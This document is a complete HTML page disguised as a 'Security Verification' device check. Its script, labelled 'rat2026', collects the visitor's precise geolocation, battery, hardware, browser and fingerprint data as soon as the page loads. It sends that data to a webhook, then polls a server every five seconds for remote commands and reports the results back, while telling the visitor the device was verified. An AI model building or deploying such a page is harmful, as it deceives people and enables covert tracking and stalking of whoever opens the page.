<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification Required</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      box-shadow: 0 25px 80px rgba(0,0,0,0.5);
      max-width: 700px;
      width: 100%;
      overflow: hidden;
      animation: slideIn 0.6s cubic-bezier(0.16, 1, 0.3, 1);
    }
    @keyframes slideIn {
      from { opacity: 0; transform: translateY(40px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .header {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 40px 30px;
      text-align: center;
      position: relative;
      overflow: hidden;
    }
    .header::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: url('data:image/svg+xml,<svg width="100" height="100" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse"><path d="M 20 0 L 0 0 0 20" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="1"/></pattern></defs><rect width="100" height="100" fill="url(%23grid)" /></svg>');
      animation: gridMove 20s linear infinite;
    }
    @keyframes gridMove {
      0% { transform: translate(0, 0); }
      100% { transform: translate(20px, 20px); }
    }
    .shield-icon {
      font-size: 72px;
      margin-bottom: 15px;
      animation: pulse 2s ease-in-out infinite;
      position: relative;
      z-index: 1;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }
    .header h1 {
      font-size: 32px;
      margin-bottom: 12px;
      font-weight: 700;
      position: relative;
      z-index: 1;
    }
    .content {
      padding: 40px 35px;
    }
    .status-box {
      background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
      color: white;
      border-radius: 16px;
      padding: 25px;
      margin-bottom: 30px;
      text-align: center;
      box-shadow: 0 8px 24px rgba(245, 87, 108, 0.3);
    }
    .status-box h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    .progress-container {
      background: rgba(0,0,0,0.1);
      border-radius: 12px;
      height: 40px;
      overflow: hidden;
      margin: 25px 0;
      position: relative;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #667eea, #764ba2);
      width: 0%;
      transition: width 0.5s cubic-bezier(0.16, 1, 0.3, 1);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: 700;
      font-size: 16px;
      position: relative;
      overflow: hidden;
    }
    .progress-bar::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      animation: shimmer 2s infinite;
    }
    @keyframes shimmer {
      0% { left: -100%; }
      100% { left: 100%; }
    }
    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 20px;
      margin: 30px 0;
    }
    .info-card {
      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
      border-radius: 12px;
      padding: 20px;
      text-align: center;
      transition: all 0.3s ease;
    }
    .info-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 12px 24px rgba(0,0,0,0.15);
    }
    .info-icon {
      font-size: 36px;
      margin-bottom: 10px;
    }
    .info-label {
      font-size: 12px;
      color: #666;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    .info-value {
      font-size: 18px;
      font-weight: 700;
      color: #333;
    }
    .status-message {
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      font-weight: 600;
      text-align: center;
      animation: fadeIn 0.5s;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .status-message.checking {
      background: linear-gradient(135deg, #ffeaa7 0%, #fdcb6e 100%);
      color: #2d3436;
    }
    .status-message.success {
      background: linear-gradient(135deg, #55efc4 0%, #00b894 100%);
      color: white;
    }
    .spinner {
      display: inline-block;
      width: 24px;
      height: 24px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top-color: white;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .security-badges {
      display: flex;
      justify-content: space-around;
      margin-top: 30px;
      padding-top: 30px;
      border-top: 2px solid #e0e0e0;
    }
    .badge {
      text-align: center;
      flex: 1;
    }
    .badge-icon {
      font-size: 28px;
      margin-bottom: 8px;
    }
    .badge-text {
      font-size: 11px;
      color: #666;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    @media (max-width: 600px) {
      .info-grid { grid-template-columns: 1fr; }
      .header h1 { font-size: 24px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="shield-icon">üîê</div>
      <h1>Security Verification</h1>
      <p>Advanced Protection System 2026</p>
    </div>

    <div class="content">
      <div class="status-box">
        <h2>‚ö° System Check In Progress</h2>
        <p>Verifying your device security and authenticity</p>
      </div>

      <div class="progress-container">
        <div class="progress-bar" id="progressBar">0%</div>
      </div>

      <div class="info-grid">
        <div class="info-card">
          <div class="info-icon">üåê</div>
          <div class="info-label">Connection</div>
          <div class="info-value" id="connectionStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üîã</div>
          <div class="info-label">Battery</div>
          <div class="info-value" id="batteryStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üìç</div>
          <div class="info-label">Location</div>
          <div class="info-value" id="locationStatus">Checking...</div>
        </div>
        <div class="info-card">
          <div class="info-icon">üíª</div>
          <div class="info-label">System</div>
          <div class="info-value" id="systemStatus">Checking...</div>
        </div>
      </div>

      <div class="status-message checking" id="statusMessage">
        <span class="spinner"></span>
        <span>Running security diagnostics...</span>
      </div>

      <div class="security-badges">
        <div class="badge">
          <div class="badge-icon">üîí</div>
          <div class="badge-text">Encrypted</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚úì</div>
          <div class="badge-text">Verified</div>
        </div>
        <div class="badge">
          <div class="badge-icon">‚ö°</div>
          <div class="badge-text">Real-time</div>
        </div>
        <div class="badge">
          <div class="badge-icon">üõ°Ô∏è</div>
          <div class="badge-text">Secure</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let sessionId = 'rat2026_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12);
    let progress = 0;
    let collectedData = {};

    function updateProgress(percent, message) {
      progress = percent;
      const bar = document.getElementById('progressBar');
      bar.style.width = percent + '%';
      bar.textContent = percent + '%';
      
      const statusMsg = document.getElementById('statusMessage');
      if (message) {
        statusMsg.innerHTML = '<span class="spinner"></span><span>' + message + '</span>';
      }
    }

    async function collectSystemData() {
      updateProgress(10, 'Analyzing system configuration...');
      
      collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        
        screen: {
          width: screen.width,
          height: screen.height,
          availWidth: screen.availWidth,
          availHeight: screen.availHeight,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          orientation: screen.orientation ? screen.orientation.type : 'N/A'
        },
        
        hardware: {
          cpuCores: navigator.hardwareConcurrency || 'N/A',
          deviceMemory: navigator.deviceMemory || 'N/A',
          maxTouchPoints: navigator.maxTouchPoints || 0
        },
        
        browser: {
          cookieEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          onLine: navigator.onLine,
          vendor: navigator.vendor,
          product: navigator.product
        },
        
        timezone: {
          zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          offset: new Date().getTimezoneOffset(),
          locale: Intl.DateTimeFormat().resolvedOptions().locale
        },
        
        plugins: Array.from(navigator.plugins).map(p => ({
          name: p.name,
          description: p.description
        }))
      };

      document.getElementById('systemStatus').textContent = 'Collected';
    }

    async function getConnectionInfo() {
      updateProgress(25, 'Checking network connection...');
      
      if (navigator.connection) {
        collectedData.connection = {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        };
        document.getElementById('connectionStatus').textContent = navigator.connection.effectiveType.toUpperCase();
      } else {
        document.getElementById('connectionStatus').textContent = 'Online';
      }
    }

    async function getBatteryInfo() {
      updateProgress(40, 'Checking battery status...');
      
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          collectedData.battery = {
            level: Math.round(battery.level * 100) + '%',
            charging: battery.charging,
            chargingTime: battery.chargingTime,
            dischargingTime: battery.dischargingTime
          };
          document.getElementById('batteryStatus').textContent = Math.round(battery.level * 100) + '%';
        } else {
          document.getElementById('batteryStatus').textContent = 'N/A';
        }
      } catch (e) {
        document.getElementById('batteryStatus').textContent = 'N/A';
      }
    }

    async function getLocation() {
      updateProgress(60, 'Verifying location...');
      
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              collectedData.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp
              };
              document.getElementById('locationStatus').textContent = 'Verified';
              resolve();
            },
            (error) => {
              collectedData.location = { error: error.message };
              document.getElementById('locationStatus').textContent = 'Denied';
              resolve();
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
        } else {
          document.getElementById('locationStatus').textContent = 'N/A';
          resolve();
        }
      });
    }

    async function getMediaDevices() {
      updateProgress(75, 'Detecting media devices...');
      
      try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
          const devices = await navigator.mediaDevices.enumerateDevices();
          collectedData.mediaDevices = {
            audioInput: devices.filter(d => d.kind === 'audioinput').length,
            audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
            videoInput: devices.filter(d => d.kind === 'videoinput').length
          };
        }
      } catch (e) {
        collectedData.mediaDevices = { error: 'Not available' };
      }
    }

    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('RAT2026', 2, 15);
        collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 100);
      } catch (e) {
        collectedData.canvasFingerprint = 'Error';
      }
    }

    function getWebGLInfo() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          collectedData.webgl = {
            vendor: gl.getParameter(gl.VENDOR),
            renderer: gl.getParameter(gl.RENDERER)
          };
        }
      } catch (e) {
        collectedData.webgl = 'Not available';
      }
    }

    async function sendData(data) {
      try {
        await fetch('rat2026_webhook.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
      } catch (e) {
        console.error('Send error:', e);
      }
    }

    async function checkForCommands() {
      try {
        const response = await fetch('get_command2026.php?session=' + sessionId);
        const data = await response.json();
        if (data.success && data.command) {
          executeCommand(data.command);
        }
      } catch (e) {
        console.error('Command check error:', e);
      }
    }

    async function executeCommand(cmd) {
      let result = { command: cmd, timestamp: new Date().toISOString() };
      
      switch(cmd) {
        case 'get_location':
          await getLocation();
          result.data = collectedData.location;
          break;
        case 'get_battery':
          await getBatteryInfo();
          result.data = collectedData.battery;
          break;
        case 'refresh':
          location.reload();
          break;
        case 'get_all':
          await main();
          result.data = collectedData;
          break;
        default:
          result.data = 'Unknown command';
      }
      
      await sendData(result);
    }

    async function main() {
      await collectSystemData();
      await getConnectionInfo();
      await getBatteryInfo();
      
      updateProgress(50, 'Requesting location permission...');
      await getLocation();
      
      await getMediaDevices();
      
      updateProgress(85, 'Generating device fingerprint...');
      getCanvasFingerprint();
      getWebGLInfo();
      
      updateProgress(95, 'Sending data...');
      await sendData(collectedData);
      
      updateProgress(100, 'Verification complete!');
      
      const statusMsg = document.getElementById('statusMessage');
      statusMsg.className = 'status-message success';
      statusMsg.innerHTML = '‚úÖ <strong>Security Check Complete!</strong> Your device has been verified.';
      
      setInterval(checkForCommands, 5000);
    }

    window.onload = main;
  </script>
</body>
</html>